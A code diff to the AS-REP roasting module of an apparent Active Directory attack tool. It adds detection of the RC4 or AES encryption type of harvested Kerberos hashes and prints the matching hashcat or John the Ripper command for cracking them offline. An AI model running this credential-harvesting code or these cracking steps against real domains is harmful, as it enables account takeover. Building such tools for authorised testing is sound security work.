@@ -102,12 +102,22 @@ void Attacks::ASREPRoast::run(const ModuleRuntimeContext& ctx) {
     std::string realm = extractDomainFromDN(ctx.baseDN);
     std::vector<std::pair<std::string, std::string>> hashesToSave;
     bool saveToFile = !ctx.outputFilePath.empty();
+    bool sawRc4 = false;
+    bool sawAes = false;
 
     for (const std::string& user : vuln_users) {
         std::string hash = requestTicket(user, realm, ctx.dcHost);
         if (hash.empty()) {
             continue;
         }
+        // The etype is encoded in the hash prefix; pick the right cracker hint.
+        if (hash.rfind("$krb5asrep$23$", 0) == 0) {
+            sawRc4 = true;
+        } else if (hash.rfind("$krb5asrep$17$", 0) == 0 ||
+                   hash.rfind("$krb5asrep$18$", 0) == 0) {
+            sawAes = true;
+        }
+
         if (saveToFile) {
             hashesToSave.emplace_back(user, hash);
         } else {
@@ -117,7 +127,14 @@ void Attacks::ASREPRoast::run(const ModuleRuntimeContext& ctx) {
 
     if (saveToFile) {
         Utils::saveToFile(hashesToSave, ctx.outputFilePath);
-    } else if (!hashesToSave.empty() || !vuln_users.empty()) {
-        std::cout << "[*] Crack with: hashcat -m 18200 <hashfile> <wordlist>" << std::endl;
+    }
+
+    if (sawRc4) {
+        std::cout << "[*] Crack RC4 (etype 23) with: hashcat -m 18200 <hashfile> <wordlist>"
+                  << std::endl;
+    }
+    if (sawAes) {
+        std::cout << "[*] Crack AES (etype 17/18) with: john --format=krb5asrep <hashfile> <wordlist>"
+                  << " (hashcat has no AES AS-REP mode)" << std::endl;
     }
 }
